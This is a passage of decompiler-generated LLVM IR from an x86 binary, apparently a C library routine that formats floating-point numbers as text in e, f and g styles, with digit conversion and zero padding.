  %v1_804f3e6 = icmp eq i1 %v10_804f3e4, false
  br i1 %v1_804f3e6, label %dec_label_pc_804f3ef, label %dec_label_pc_804f3e8

dec_label_pc_804f3e8:                             ; preds = %entry
  %v1_804f3e8 = add i32 %v7_804f3ce, 6
  %v11_804f3e8 = trunc i32 %v1_804f3e8 to i8
  store i32 %v1_804f3e8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f3ef

dec_label_pc_804f3ef:                             ; preds = %entry, %dec_label_pc_804f3e8
  %stack_var_-206.0 = phi i8 [ %v3_804f3ce, %entry ], [ %v11_804f3e8, %dec_label_pc_804f3e8 ]
  %v2_804f3ef = icmp slt i32 %v2_804f3d1, 0
  %v1_804f3f1 = icmp eq i1 %v2_804f3ef, false
  br i1 %v1_804f3f1, label %dec_label_pc_804f3f8, label %dec_label_pc_804f3f3

dec_label_pc_804f3f3:                             ; preds = %dec_label_pc_804f3ef
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f3f8

dec_label_pc_804f3f8:                             ; preds = %dec_label_pc_804f3ef, %dec_label_pc_804f3f3
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_804f407 = add i32 %tmp112, 12
  %v2_804f407 = inttoptr i32 %v1_804f407 to i32*
  %v3_804f407 = load i32, i32* %v2_804f407, align 4
  store i32 %v3_804f407, i32* %eax.global-to-local, align 4
  %v2_804f40a = and i32 %v3_804f407, 2
  %v3_804f40a = icmp eq i32 %v2_804f40a, 0
  br i1 %v3_804f40a, label %dec_label_pc_804f418, label %dec_label_pc_804f424

dec_label_pc_804f418:                             ; preds = %dec_label_pc_804f3f8
  %v2_804f418 = urem i32 %v3_804f407, 2
  %tmp143 = trunc i32 %v2_804f418 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_804f424

dec_label_pc_804f424:                             ; preds = %dec_label_pc_804f418, %dec_label_pc_804f3f8
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_804f3f8 ], [ %tmp144, %dec_label_pc_804f418 ]
  %v1_804f438 = udiv i32 %v3_804f407, 256
  %tmp146 = and i32 %v1_804f438, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_804f58a, label %dec_label_pc_804f4aa

dec_label_pc_804f4aa:                             ; preds = %dec_label_pc_804f424
  store i3 %v4_804f3c0, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_804f4b1 = add i32 %tmp112, 16
  %v2_804f4b1 = inttoptr i32 %v1_804f4b1 to i32*
  store i32 32, i32* %v2_804f4b1, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_804f4c8 = add i8 %stack_var_-206.0, -96
  %v6_804f4c8 = sub i8 95, %stack_var_-206.0
  %v7_804f4c8 = and i8 %v6_804f4c8, %stack_var_-206.0
  %v8_804f4c8 = icmp slt i8 %v7_804f4c8, 0
  %v9_804f4c8 = icmp eq i8 %v4_804f4c8, 0
  %v10_804f4c8 = icmp slt i8 %v4_804f4c8, 0
  %v3_804f4cd = icmp eq i1 %v10_804f4c8, %v8_804f4c8
  %v4_804f4cd = icmp eq i1 %v9_804f4c8, false
  %v5_804f4cd = and i1 %v4_804f4cd, %v3_804f4cd
  br i1 %v5_804f4cd, label %dec_label_pc_804f4d4, label %dec_label_pc_804f4cf

dec_label_pc_804f4cf:                             ; preds = %dec_label_pc_804f4aa
  br label %dec_label_pc_804f4d4

dec_label_pc_804f4d4:                             ; preds = %dec_label_pc_804f4aa, %dec_label_pc_804f4cf
  %v2_804f4dc = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f4dc, i32* @ecx, align 4
  br label %dec_label_pc_804f8af

dec_label_pc_804f58a:                             ; preds = %dec_label_pc_804f424
  %v1_804f449 = add i3 %v4_804f3c0, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_804f58e = and i32 %v3_804f407, -65536
  %v2_804f593 = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_804f593, i32* %edx.global-to-local, align 4
  %v1_804f59a = udiv i16 %tmp103, 256
  %v2_804f59a = zext i16 %v1_804f59a to i32
  %v3_804f59a = mul nuw nsw i32 %v2_804f59a, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_804f58e.masked = zext i16 %tmp148 to i32
  %v11_804f59a = or i32 %v4_804f58e.masked, %v3_804f59a
  %v10_804f59a = or i32 %v11_804f59a, %v6_804f58e
  %v12_804f59a = or i32 %v10_804f59a, 3072
  store i32 %v12_804f59a, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_804f449, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_804f5ae

dec_label_pc_804f5ae:                             ; preds = %dec_label_pc_804f5ff.dec_label_pc_804f5ae_crit_edge, %dec_label_pc_804f58a
  %v2_804f5cb = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_804f58a ], [ %v2_804f5cb.pre, %dec_label_pc_804f5ff.dec_label_pc_804f5ae_crit_edge ]
  %v1_804f5ae = phi i3 [ %v1_804f449, %dec_label_pc_804f58a ], [ %v1_804f5ae.pre, %dec_label_pc_804f5ff.dec_label_pc_804f5ae_crit_edge ]
  %v3_804f5d5 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_804f58a ], [ %v0_804f5ae.pre, %dec_label_pc_804f5ff.dec_label_pc_804f5ae_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_804f593, %dec_label_pc_804f58a ], [ %v4_804f5d0, %dec_label_pc_804f5ff.dec_label_pc_804f5ae_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_804f5d5 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_804f5c8 = sitofp i32 %tmp149 to x86_fp80
  %v4_804f5cb = fsub x86_fp80 %v2_804f5cb, %v5_804f5c8
  store i3 %v1_804f5ae, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804f5d0 = add i32 %stack_var_-212.0, 9
  %v4_804f5d5 = fmul x86_fp80 %v3_804f5d5, %v4_804f5cb
  store x86_fp80 %v4_804f5d5, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f5d7

dec_label_pc_804f5d7:                             ; preds = %dec_label_pc_804f5d7.dec_label_pc_804f5d7_crit_edge, %dec_label_pc_804f5ae
  %v0_804f5e9 = phi i32 [ %v0_804f5e9.pre, %dec_label_pc_804f5d7.dec_label_pc_804f5d7_crit_edge ], [ %tmp149, %dec_label_pc_804f5ae ]
  %v0_804f5d7 = phi i32 [ %v0_804f5d7.pre, %dec_label_pc_804f5d7.dec_label_pc_804f5d7_crit_edge ], [ 0, %dec_label_pc_804f5ae ]
  %v1_804f5d7 = add i32 %v0_804f5d7, 1
  store i32 %v1_804f5d7, i32* %esi.global-to-local, align 4
  %v2_804f5dc = sub i32 %v4_804f5d0, %v1_804f5d7
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_804f5e9, 10
  %tmp136 = urem i32 %v0_804f5e9, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_804f5dc, i32* %eax.global-to-local, align 4
  %v1_804f5f5 = or i32 %tmp136, 48
  %v8_804f5f5 = trunc i32 %v1_804f5f5 to i8
  store i32 %v1_804f5f5, i32* %edx.global-to-local, align 4
  %v3_804f5fb = inttoptr i32 %v2_804f5dc to i8*
  store i8 %v8_804f5f5, i8* %v3_804f5fb, align 1
  %v7_804f5fd = icmp sgt i32 %v1_804f5d7, 8
  br i1 %v7_804f5fd, label %dec_label_pc_804f5ff, label %dec_label_pc_804f5d7.dec_label_pc_804f5d7_crit_edge

dec_label_pc_804f5d7.dec_label_pc_804f5d7_crit_edge: ; preds = %dec_label_pc_804f5d7
  %v0_804f5d7.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804f5e9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f5d7

dec_label_pc_804f5ff:                             ; preds = %dec_label_pc_804f5d7
  %v0_804f5ff = load i32, i32* @edi, align 4
  %v1_804f5ff = add i32 %v0_804f5ff, 1
  store i32 %v1_804f5ff, i32* @edi, align 4
  %v7_804f603 = icmp sgt i32 %v1_804f5ff, 2
  br i1 %v7_804f603, label %dec_label_pc_804f605, label %dec_label_pc_804f5ff.dec_label_pc_804f5ae_crit_edge

dec_label_pc_804f5ff.dec_label_pc_804f5ae_crit_edge: ; preds = %dec_label_pc_804f5ff
  %v0_804f5ae.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_804f5ae.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_804f5cb.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804f5ae

dec_label_pc_804f605:                             ; preds = %dec_label_pc_804f5ff
  %v0_804f605 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804f605 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_804f605, x86_fp80* %st0.global-to-local, align 4
  %v2_804f607 = add i3 %v0_804f605, 2
  store i3 %v2_804f607, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804f609 = add i8 %stack_var_-206.0, -96
  %v6_804f609 = sub i8 95, %stack_var_-206.0
  %v7_804f609 = and i8 %v6_804f609, %stack_var_-206.0
  %v8_804f609 = icmp slt i8 %v7_804f609, 0
  %v9_804f609 = icmp eq i8 %v4_804f609, 0
  %v10_804f609 = icmp slt i8 %v4_804f609, 0
  %v3_804f60e = icmp eq i1 %v10_804f609, %v8_804f609
  %v4_804f60e = icmp eq i1 %v9_804f609, false
  %v5_804f60e = and i1 %v4_804f60e, %v3_804f60e
  br i1 %v5_804f60e, label %dec_label_pc_804f61d, label %dec_label_pc_804f610

dec_label_pc_804f610:                             ; preds = %dec_label_pc_804f605
  %v4_804f610 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_804f61d

dec_label_pc_804f61d:                             ; preds = %dec_label_pc_804f605, %dec_label_pc_804f610
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_804f605 ], [ %v4_804f610, %dec_label_pc_804f610 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_804f605 ], [ 69, %dec_label_pc_804f610 ]
  %v12_804f61d = icmp eq i8 %stack_var_-206.1, 103
  %v1_804f622 = icmp eq i1 %v12_804f61d, false
  br i1 %v1_804f622, label %dec_label_pc_804f62b, label %dec_label_pc_804f624

dec_label_pc_804f624:                             ; preds = %dec_label_pc_804f61d
  %v0_804f624 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_804f624, 1
  br i1 %tmp137, label %dec_label_pc_804f632, label %dec_label_pc_804f628

dec_label_pc_804f628:                             ; preds = %dec_label_pc_804f624
  %v1_804f628 = add i32 %v0_804f624, -1
  store i32 %v1_804f628, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f632

dec_label_pc_804f62b:                             ; preds = %dec_label_pc_804f61d
  %v12_804f62b = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_804f62b, label %dec_label_pc_804f636, label %dec_label_pc_804f62b.dec_label_pc_804f632_crit_edge

dec_label_pc_804f62b.dec_label_pc_804f632_crit_edge: ; preds = %dec_label_pc_804f62b
  %v0_804f632.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f632

dec_label_pc_804f632:                             ; preds = %dec_label_pc_804f62b.dec_label_pc_804f632_crit_edge, %dec_label_pc_804f624, %dec_label_pc_804f628
  %v0_804f632 = phi i32 [ %v0_804f632.pre, %dec_label_pc_804f62b.dec_label_pc_804f632_crit_edge ], [ %v0_804f624, %dec_label_pc_804f624 ], [ %v1_804f628, %dec_label_pc_804f628 ]
  store i32 %v0_804f632, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f663

dec_label_pc_804f636:                             ; preds = %dec_label_pc_804f62b
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_804f63a = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f63a = add i32 %v0_804f63a, -1
  store i32 %v2_804f63a, i32* %ebx.global-to-local, align 4
  %v5_804f641 = icmp slt i32 %v2_804f63a, -1
  br i1 %v5_804f641, label %dec_label_pc_804f643, label %dec_label_pc_804f663

dec_label_pc_804f643:                             ; preds = %dec_label_pc_804f636
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804f64b = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804f64b, i32* %eax.global-to-local, align 4
  %v4_804f653 = bitcast i32* %stack_var_-72 to i8*
  %v5_804f653 = call i32 @__GI_memset(i8* %v4_804f653, i32 48, i32 21)
  store i32 %v5_804f653, i32* %eax.global-to-local, align 4
  %v0_804f673.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f663

dec_label_pc_804f663:                             ; preds = %dec_label_pc_804f636, %dec_label_pc_804f643, %dec_label_pc_804f632
  %v1_804f683 = phi i32 [ %v0_804f632, %dec_label_pc_804f632 ], [ %v0_804f673.pr.pre, %dec_label_pc_804f643 ], [ %v2_804f63a, %dec_label_pc_804f636 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_804f676 = icmp sgt i32 %v1_804f683, 20
  br i1 %v7_804f676, label %dec_label_pc_804f678, label %dec_label_pc_804f683

dec_label_pc_804f678:                             ; preds = %dec_label_pc_804f663
  %v2_804f678 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_804f678, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f697.preheader

dec_label_pc_804f683:                             ; preds = %dec_label_pc_804f663
  %v0_804f683 = load i32, i32* @esp, align 4
  %v2_804f683 = add i32 %v1_804f683, 165
  %v3_804f683 = add i32 %v2_804f683, %v0_804f683
  store i32 %v3_804f683, i32* %eax.global-to-local, align 4
  %v1_804f68a = add i32 %v3_804f683, 2
  store i32 %v1_804f68a, i32* %ecx.global-to-local, align 4
  %v2_804f68d = inttoptr i32 %v1_804f68a to i8*
  %v3_804f68d = load i8, i8* %v2_804f68d, align 1
  %v4_804f68d = add i8 %v3_804f68d, -53
  %v9_804f68d = sub i8 52, %v3_804f68d
  %v10_804f68d = and i8 %v9_804f68d, %v3_804f68d
  %v11_804f68d = icmp slt i8 %v10_804f68d, 0
  %v13_804f68d = icmp slt i8 %v4_804f68d, 0
  %v2_804f691 = icmp eq i1 %v13_804f68d, %v11_804f68d
  %v3_804f691 = zext i1 %v2_804f691 to i32
  br label %dec_label_pc_804f697.preheader

dec_label_pc_804f697.preheader:                   ; preds = %dec_label_pc_804f683, %dec_label_pc_804f678
  %v0_804f69763 = phi i32 [ %v1_804f68a, %dec_label_pc_804f683 ], [ %v2_804f678, %dec_label_pc_804f678 ]
  %storemerge52 = phi i32 [ %v3_804f691, %dec_label_pc_804f683 ], [ 0, %dec_label_pc_804f678 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f697

dec_label_pc_804f697:                             ; preds = %dec_label_pc_804f697.backedge, %dec_label_pc_804f697.preheader
  %v3_804f698 = phi i32 [ %v3_804f698.pre, %dec_label_pc_804f697.backedge ], [ %storemerge52, %dec_label_pc_804f697.preheader ]
  %v0_804f697 = phi i32 [ %v0_804f69a, %dec_label_pc_804f697.backedge ], [ %v0_804f69763, %dec_label_pc_804f697.preheader ]
  %v1_804f697 = add i32 %v0_804f697, -1
  store i32 %v1_804f697, i32* %ecx.global-to-local, align 4
  %v1_804f698 = inttoptr i32 %v1_804f697 to i8*
  %v2_804f698 = load i8, i8* %v1_804f698, align 1
  %v4_804f698 = trunc i32 %v3_804f698 to i8
  %v5_804f698 = add i8 %v2_804f698, %v4_804f698
  store i8 %v5_804f698, i8* %v1_804f698, align 1
  %v0_804f69a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f69a = inttoptr i32 %v0_804f69a to i8*
  %v2_804f69a = load i8, i8* %v1_804f69a, align 1
  %v3_804f69a = zext i8 %v2_804f69a to i32
  %v4_804f69a = load i32, i32* %edx.global-to-local, align 4
  %v5_804f69a = and i32 %v4_804f69a, -256
  %v6_804f69a = or i32 %v5_804f69a, %v3_804f69a
  store i32 %v6_804f69a, i32* %edx.global-to-local, align 4
  %v7_804f69c = icmp eq i8 %v2_804f69a, 48
  br i1 %v7_804f69c, label %dec_label_pc_804f697.backedge, label %dec_label_pc_804f6a1

dec_label_pc_804f697.backedge:                    ; preds = %dec_label_pc_804f697, %dec_label_pc_804f6a1
  %v3_804f698.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f697

dec_label_pc_804f6a1:                             ; preds = %dec_label_pc_804f697
  %v2_804f6a1 = add i8 %v2_804f69a, -57
  %v7_804f6a1 = sub i8 56, %v2_804f69a
  %v8_804f6a1 = and i8 %v7_804f6a1, %v2_804f69a
  %v9_804f6a1 = icmp slt i8 %v8_804f6a1, 0
  %v10_804f6a1 = icmp eq i8 %v2_804f6a1, 0
  %v11_804f6a1 = icmp slt i8 %v2_804f6a1, 0
  %v3_804f6a4 = icmp eq i1 %v11_804f6a1, %v9_804f6a1
  %v4_804f6a4 = icmp eq i1 %v10_804f6a1, false
  %v5_804f6a4 = and i1 %v4_804f6a4, %v3_804f6a4
  br i1 %v5_804f6a4, label %dec_label_pc_804f697.backedge, label %dec_label_pc_804f6a6

dec_label_pc_804f6a6:                             ; preds = %dec_label_pc_804f6a1
  %v2_804f6a6 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_804f6a6, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_804f69a, %v2_804f6a6
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_804f6b1, label %dec_label_pc_804f6be

dec_label_pc_804f6b1:                             ; preds = %dec_label_pc_804f6a6
  store i32 %v2_804f593, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f6c7

dec_label_pc_804f6be:                             ; preds = %dec_label_pc_804f6a6
  store i32 %v2_804f6a6, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_804f6a6, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f6c7

dec_label_pc_804f6c7:                             ; preds = %dec_label_pc_804f6b1, %dec_label_pc_804f6be
  %v0_804f6c7 = phi i32 [ %v0_804f69a, %dec_label_pc_804f6b1 ], [ %v2_804f6a6, %dec_label_pc_804f6be ]
  %v1_804f6c7 = add i32 %v0_804f6c7, 1
  store i32 %v1_804f6c7, i32* %eax.global-to-local, align 4
  %v2_804f6ce = inttoptr i32 %v1_804f6c7 to i8*
  store i8 0, i8* %v2_804f6ce, align 1
  br i1 %v1_804f622, label %dec_label_pc_804f6f4, label %dec_label_pc_804f6d9

dec_label_pc_804f6d9:                             ; preds = %dec_label_pc_804f6c7
  %v0_804f6d9 = load i32, i32* %esi.global-to-local, align 4
  %v5_804f6dc = icmp slt i32 %v0_804f6d9, -4
  br i1 %v5_804f6dc, label %dec_label_pc_804f701, label %dec_label_pc_804f6de

dec_label_pc_804f6de:                             ; preds = %dec_label_pc_804f6d9
  %v1_804f6de = load i32, i32* %ebx.global-to-local, align 4
  %v7_804f6e0 = icmp slt i32 %v1_804f6de, %v0_804f6d9
  br i1 %v7_804f6e0, label %dec_label_pc_804f701, label %dec_label_pc_804f6e9

dec_label_pc_804f6e9:                             ; preds = %dec_label_pc_804f6de
  %v2_804f6f0 = sub i32 %v1_804f6de, %v0_804f6d9
  store i32 %v2_804f6f0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f705

dec_label_pc_804f6f4:                             ; preds = %dec_label_pc_804f6c7
  %v4_804f6f4 = zext i8 %stack_var_-206.1 to i32
  %v5_804f6f4 = load i32, i32* %ecx.global-to-local, align 4
  %v6_804f6f4 = and i32 %v5_804f6f4, -256
  %v7_804f6f4 = or i32 %v6_804f6f4, %v4_804f6f4
  store i32 %v7_804f6f4, i32* %ecx.global-to-local, align 4
  %v10_804f6fc = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_804f6fc, label %dec_label_pc_804f6f4.dec_label_pc_804f705_crit_edge, label %dec_label_pc_804f701

dec_label_pc_804f6f4.dec_label_pc_804f705_crit_edge: ; preds = %dec_label_pc_804f6f4
  %v0_804f705.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f705

dec_label_pc_804f701:                             ; preds = %dec_label_pc_804f6d9, %dec_label_pc_804f6de, %dec_label_pc_804f6f4
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_804f6f4 ], [ 103, %dec_label_pc_804f6de ], [ 103, %dec_label_pc_804f6d9 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f70f

dec_label_pc_804f705:                             ; preds = %dec_label_pc_804f6f4.dec_label_pc_804f705_crit_edge, %dec_label_pc_804f6e9
  %v0_804f705 = phi i32 [ %v0_804f705.pre, %dec_label_pc_804f6f4.dec_label_pc_804f705_crit_edge ], [ %v0_804f6d9, %dec_label_pc_804f6e9 ]
  store i32 %v0_804f705, i32* %ebx.global-to-local, align 4
  %v2_804f707 = icmp slt i32 %v0_804f705, 0
  %v1_804f709 = icmp eq i1 %v2_804f707, false
  br i1 %v1_804f709, label %dec_label_pc_804f70f, label %dec_label_pc_804f70b

dec_label_pc_804f70b:                             ; preds = %dec_label_pc_804f705
  %v0_804f70b = load i32, i32* %edx.global-to-local, align 4
  %v1_804f70b = add i32 %v0_804f70b, -1
  store i32 %v1_804f70b, i32* %edx.global-to-local, align 4
  %v1_804f70c = inttoptr i32 %v1_804f70b to i8*
  store i8 48, i8* %v1_804f70c, align 1
  %v0_804f744.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f70f

dec_label_pc_804f70f:                             ; preds = %dec_label_pc_804f705, %dec_label_pc_804f701, %dec_label_pc_804f70b
  %v1_804f79f = phi i32 [ %v0_804f705, %dec_label_pc_804f705 ], [ %v0_804f744.pre, %dec_label_pc_804f70b ], [ 0, %dec_label_pc_804f701 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_804f705 ], [ 102, %dec_label_pc_804f70b ], [ %stack_var_-197.0, %dec_label_pc_804f701 ]
  %v2_804f70f = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_804f70f, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_804f72a = load i32, i32* %edx.global-to-local, align 4
  %v1_804f72a = inttoptr i32 %v0_804f72a to i8*
  %v2_804f72a = load i8, i8* %v1_804f72a, align 1
  %v3_804f72a = zext i8 %v2_804f72a to i32
  %v5_804f72a = and i32 %v2_804f70f, -256
  %v6_804f72a = or i32 %v3_804f72a, %v5_804f72a
  store i32 %v6_804f72a, i32* %eax.global-to-local, align 4
  %v1_804f72c = add i32 %v0_804f72a, 1
  store i32 %v1_804f72c, i32* %edi.global-to-local, align 4
  store i32 %v6_804f72a, i32* %stack_var_-22, align 4
  %v2_804f73a = sub i32 %v1_804f6c7, %v1_804f72c
  store i32 %v2_804f73a, i32* %edx.global-to-local, align 4
  %v1_804f744 = icmp eq i32 %v1_804f79f, 0
  %v2_804f744 = icmp slt i32 %v1_804f79f, 0
  br i1 %v2_804f744, label %dec_label_pc_804f793, label %dec_label_pc_804f748

dec_label_pc_804f748:                             ; preds = %dec_label_pc_804f70f
  store i32 112, i32* %stack_var_-144, align 4
  %v2_804f754 = sub i32 %v1_804f79f, %v2_804f73a
  %v8_804f754 = xor i32 %v2_804f73a, %v1_804f79f
  %v9_804f754 = xor i32 %v2_804f754, %v1_804f79f
  %v10_804f754 = and i32 %v9_804f754, %v8_804f754
  %v11_804f754 = icmp slt i32 %v10_804f754, 0
  %v13_804f754 = icmp slt i32 %v2_804f754, 0
  %v2_804f756 = icmp eq i1 %v13_804f754, %v11_804f754
  br i1 %v2_804f756, label %dec_label_pc_804f758, label %dec_label_pc_804f78c

dec_label_pc_804f758:                             ; preds = %dec_label_pc_804f748
  store i32 %v2_804f754, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_804f754, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_804f76d, label %dec_label_pc_804f788

dec_label_pc_804f76d:                             ; preds = %dec_label_pc_804f758
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_804f788

dec_label_pc_804f788:                             ; preds = %dec_label_pc_804f758, %dec_label_pc_804f76d
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_804f76d ], [ %stack_var_-132, %dec_label_pc_804f758 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f7a8

dec_label_pc_804f78c:                             ; preds = %dec_label_pc_804f748
  %v4_804f78e = icmp eq i1 %v1_804f744, false
  br i1 %v4_804f78e, label %dec_label_pc_804f799, label %dec_label_pc_804f790

dec_label_pc_804f790:                             ; preds = %dec_label_pc_804f78c
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f793

dec_label_pc_804f793:                             ; preds = %dec_label_pc_804f70f, %dec_label_pc_804f790
  %v0_804f7db73 = phi i32 [ %v1_804f79f, %dec_label_pc_804f70f ], [ -1, %dec_label_pc_804f790 ]
  %v2_804f793 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804f793, i32* @ecx, align 4
  br label %dec_label_pc_804f7a8

dec_label_pc_804f799:                             ; preds = %dec_label_pc_804f78c
  %v2_804f79d = add i32 %v1_804f72c, %v1_804f79f
  store i32 %v2_804f79d, i32* %edi.global-to-local, align 4
  %v2_804f79f = sub i32 %v2_804f73a, %v1_804f79f
  store i32 %v2_804f79f, i32* %edx.global-to-local, align 4
  %v2_804f7a1 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804f7a1, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f7a8

dec_label_pc_804f7a8:                             ; preds = %dec_label_pc_804f793, %dec_label_pc_804f788, %dec_label_pc_804f799
  %v0_804f7db72 = phi i32 [ %v0_804f7db73, %dec_label_pc_804f793 ], [ -1, %dec_label_pc_804f788 ], [ -1, %dec_label_pc_804f799 ]
  %v0_804f7c4 = phi i32 [ %v2_804f793, %dec_label_pc_804f793 ], [ %storemerge10, %dec_label_pc_804f788 ], [ %v2_804f7a1, %dec_label_pc_804f799 ]
  %v0_804f7b5 = phi i32 [ %v2_804f73a, %dec_label_pc_804f793 ], [ 0, %dec_label_pc_804f788 ], [ %v2_804f79f, %dec_label_pc_804f799 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_804f7af = inttoptr i32 %v1_804f407 to i8*
  %v3_804f7af = load i8, i8* %v2_804f7af, align 1
  %v4_804f7af = and i8 %v3_804f7af, 16
  %v5_804f7af = icmp eq i8 %v4_804f7af, 0
  %v1_804f7b3 = icmp eq i1 %v5_804f7af, false
  br i1 %v1_804f7b3, label %dec_label_pc_804f7c4, label %dec_label_pc_804f7b5

dec_label_pc_804f7b5:                             ; preds = %dec_label_pc_804f7a8
  %v1_804f7b5 = icmp eq i32 %v0_804f7b5, 0
  %v1_804f7b7 = icmp eq i1 %v1_804f7b5, false
  br i1 %v1_804f7b7, label %dec_label_pc_804f7c4, label %dec_label_pc_804f7b9

dec_label_pc_804f7b9:                             ; preds = %dec_label_pc_804f7b5
  br i1 %v12_804f61d, label %dec_label_pc_804f7db, label %dec_label_pc_804f7c0

dec_label_pc_804f7c0:                             ; preds = %dec_label_pc_804f7b9
  %v0_804f7c0 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_804f7c0, 1
  br i1 %tmp140, label %dec_label_pc_804f7db, label %dec_label_pc_804f7c4

dec_label_pc_804f7c4:                             ; preds = %dec_label_pc_804f7c0, %dec_label_pc_804f7b5, %dec_label_pc_804f7a8
  %v1_804f7c4 = inttoptr i32 %v0_804f7c4 to i32*
  store i32 112, i32* %v1_804f7c4, align 4
  %v0_804f7ca = load i32, i32* @ecx, align 4
  %v1_804f7ca = add i32 %v0_804f7ca, 4
  %v2_804f7ca = inttoptr i32 %v1_804f7ca to i32*
  store i32 1, i32* %v2_804f7ca, align 4
  %v0_804f7d1 = load i32, i32* @ecx, align 4
  %v1_804f7d1 = add i32 %v0_804f7d1, 8
  %v2_804f7d1 = inttoptr i32 %v1_804f7d1 to i32*
  store i32 ptrtoint (i32* @global_var_80515bc.133 to i32), i32* %v2_804f7d1, align 4
  %v0_804f7d8 = load i32, i32* @ecx, align 4
  %v1_804f7d8 = add i32 %v0_804f7d8, 12
  store i32 %v1_804f7d8, i32* @ecx, align 4
  %v0_804f7db.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f7db

dec_label_pc_804f7db:                             ; preds = %dec_label_pc_804f7c0, %dec_label_pc_804f7b9, %dec_label_pc_804f7c4
